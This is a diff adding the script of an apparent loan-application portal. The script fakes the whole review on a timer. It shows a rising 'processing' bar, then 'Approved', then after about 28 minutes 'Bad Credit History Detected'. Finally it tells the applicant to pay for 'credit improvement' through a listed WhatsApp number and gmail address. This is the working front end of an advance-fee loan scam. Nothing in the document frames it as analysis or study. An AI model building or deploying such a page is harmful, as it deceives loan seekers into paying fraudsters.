+        const savedApplication = localStorage.getItem('loanApplication');
+        let applicationData;
+        
+        if (savedApplication) {
+            try {
+                applicationData = JSON.parse(savedApplication);
+                
+                // Check if this application belongs to the logged-in user
+                if (applicationData.idNumber === idNumber) {
+                    displayApplicationData(applicationData);
+                } else {
+                    // Application exists but belongs to another user
+                    createAndDisplayDemoData(idNumber);
+                }
+            } catch (error) {
+                console.error("Error parsing application data:", error);
+                createAndDisplayDemoData(idNumber);
+            }
+        } else {
+            // No application found
+            createAndDisplayDemoData(idNumber);
+        }
+        
+        showNotification('Login successful!', 'success');
+    }
+    
+    // Function to display application data
+    function displayApplicationData(data) {
+        // Populate application details
+        document.getElementById('detailName').textContent = data.fullName || 'N/A';
+        document.getElementById('detailId').textContent = data.idNumber || 'N/A';
+        document.getElementById('detailPhone').textContent = data.contactNumber || 'N/A';
+        document.getElementById('detailEmail').textContent = data.emailAddress || 'N/A';
+        document.getElementById('detailAmount').textContent = 'R' + (data.loanAmount || '0');
+        document.getElementById('detailTerm').textContent = (data.loanTerm || '0') + ' months';
+        document.getElementById('detailPurpose').textContent = data.loanPurpose || 'N/A';
+        document.getElementById('applicationDate').textContent = data.applicationDate || new Date().toLocaleDateString();
+        
+        // Set application status based on application time
+        updateApplicationStatus(data);
+    }
+    
+    // Function to update application status based on time
+    // Function to update application status based on time
+function updateApplicationStatus(data) {
+    const applicationTime = data.applicationTimestamp || new Date().getTime();
+    const currentTime = new Date().getTime();
+    const timeDiff = currentTime - applicationTime;
+    
+    const statusIndicator = document.getElementById('statusIndicator');
+    const statusText = document.getElementById('statusText');
+    const progressFill = document.getElementById('applicationProgress');
+    const progressPercentage = document.getElementById('progressPercentage');
+    
+    // 15 minutes in milliseconds
+    const fifteenMinutes = 15 * 60 * 1000;
+    // 28 minutes in milliseconds
+    const twentyEightMinutes = 28 * 60 * 1000;
+    // 32 minutes in milliseconds
+    const thirtyTwoMinutes = 32 * 60 * 1000;
+    
+    let progress = 0;
+    
+    if (timeDiff < fifteenMinutes) {
+        // First stage: Instant 65% with real-time updates
+        // Calculate progress from 65% to 97% based on time elapsed
+        progress = 65 + Math.min(Math.floor((timeDiff / fifteenMinutes) * 32), 32);
+        statusIndicator.className = 'status-indicator status-pending';
+        statusText.textContent = 'Application received and we are Processing';
+        
+        // Update status every 30 seconds if in processing stage
+        setTimeout(function() {
+            updateApplicationStatus(data);
+        }, 30000);
+    } else if (timeDiff < twentyEightMinutes) {
+        // Second stage: 15-28 minutes: 98% "Your Loan Application Qualify for an Approval"
+        progress = 69;
+        statusIndicator.className = 'status-indicator status-approved';
+        statusText.textContent = 'Your Loan Application has been Approved';
+        
+        // If just entered this stage, update after the remaining time to reach 28 minutes
+        const timeToNextStage = twentyEightMinutes - timeDiff;
+        if (timeToNextStage > 0) {
+            setTimeout(function() {
+                updateApplicationStatus(data);
+            }, timeToNextStage + 1000); // Add 1 second buffer
+        }
+    } else {
+        // Final stage: After 28-32 minutes: "Bad Credit History Detected"
+        progress = 97;
+        statusIndicator.className = 'status-indicator status-rejected';
+        statusText.textContent = 'Bad Credit History Detected';
+        
+        // Update the next steps card with credit improvement message
+        const nextStepsCard = document.querySelector('#portal-section .card:last-child');
+        if (nextStepsCard) {
+            nextStepsCard.innerHTML = `
+                <div class="card-title with-line">Credit Improvement Required</div>
+                <p>We've detected issues with your credit history that need to be addressed before we can proceed with your loan payout.</p>
+                <p style="margin-top: 15px; font-weight: bold; color: var(--primary);">Please contact us immediately via email or whatsapp to complete your credit improvement process:</p>
+                <div class="contact-item">
+                    <div class="contact-icon">
+                        <i class="fab fa-whatsapp"></i>
+                    </div>
+                    <div class="contact-text">
+                        <strong>WhatsApp</strong>
+                        +27698480097
+                    </div>
+                </div>
+                <div class="contact-item">
+                    <div class="contact-icon">
+                        <i class="fas fa-envelope"></i>
+                    </div>
+                    <div class="contact-text">
+                        <strong>Email</strong>
+                        oysterfinanceltd@gmail.com
+                    </div>
+                </div>
+                <button class="btn btn-primary btn-block" onclick="window.open('https://wa.me/+27698480097', '_blank')">
+                    <i class="fab fa-whatsapp" style="margin-right: 10px;"></i> Contact Us Now
+                </button>
+            `;
+        }
+    }
+    
+    progressFill.style.width = progress + '%';
+    progressPercentage.textContent = progress + '%';
+}
+    
+    // Function to create demo data for a new user
+    function createDemoData(idNumber) {
+        const now = new Date();
+        const demoData = {
+            idNumber: idNumber,
+            fullName: "Demo User",
+            contactNumber: "+27 71 234 5678",
+            emailAddress: "demo.user@example.com",
+            loanAmount: "50000",
+            loanTerm: "24",
+            loanPurpose: "Personal Loan",
+            applicationDate: now.toLocaleDateString(),
+            applicationTimestamp: now.getTime()
+        };
+        
+        localStorage.setItem('loanApplication', JSON.stringify(demoData));
+        return demoData;
+    }
+    
+    // Function to create and display demo data
+    function createAndDisplayDemoData(idNumber) {
+        const demoData = createDemoData(idNumber);
+        displayApplicationData(demoData);
+    }
+    
+    // Function to show notifications
+    function showNotification(message, type) {
+        const popup = document.getElementById('popupNotification');
+        const popupText = document.getElementById('popupText');
+        
+        // Set notification style based on type
+        if (type === 'error') {
+            popup.style.background = 'var(--secondary-gradient)';
+        } else if (type === 'info') {
+            popup.style.background = 'var(--primary-gradient)';
+        } else {
+            popup.style.background = 'var(--success-gradient)';
+        }
+        
+        popupText.textContent = message;
+        popup.classList.add('show');
+        
+        setTimeout(function() {
+            popup.classList.remove('show');
+        }, 3000);
+    }
+    
+    // Check for existing session on page load
+    function checkExistingSession() {
+        // Iterate through localStorage to find user data
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            
+            if (key.startsWith('userData_')) {
+                try {
+                    const userData = JSON.parse(localStorage.getItem(key));
+                    const now = new Date().getTime();
+                    const lastLogin = userData.lastLogin || 0;
+                    const thirtyDaysInMs = 30 * 24 * 60 * 60 * 1000;
+                    
+                    // If login is within 30 days, pre-fill ID
+                    if (now - lastLogin < thirtyDaysInMs) {
+                        document.getElementById('loginId').value = userData.idNumber;
+                        showNotification('Welcome back! Please enter your ID to continue.', 'info');
+                        break;
+                    }
+                } catch (error) {
+                    console.error("Error checking existing session:", error);
+                }
+            }
+        }
+    }
+
+    // Logout Button
+    document.getElementById('logoutButton').addEventListener('click', function() {
+        // Hide portal and show login form
+        document.getElementById('portal-section').style.display = 'none';
+        document.getElementById('login-section').style.display = 'block';
+        
+        // Reset login form to ID input step
+        document.getElementById('id-input-step').style.display = 'block';
+        document.getElementById('pin-input-step').style.display = 'none';
+        document.getElementById('create-pin-step').style.display = 'none';
+        
+        // Clear PIN inputs
+        document.getElementById('loginPin').value = '';
+        document.getElementById('createPin').value = '';
+        document.getElementById('confirmPin').value = '';
+        
+        showNotification('You have been logged out.', 'info');
+    });
+    
+    // Initialize
+    checkExistingSession();
+});
+</script>
+</body>
+</html>
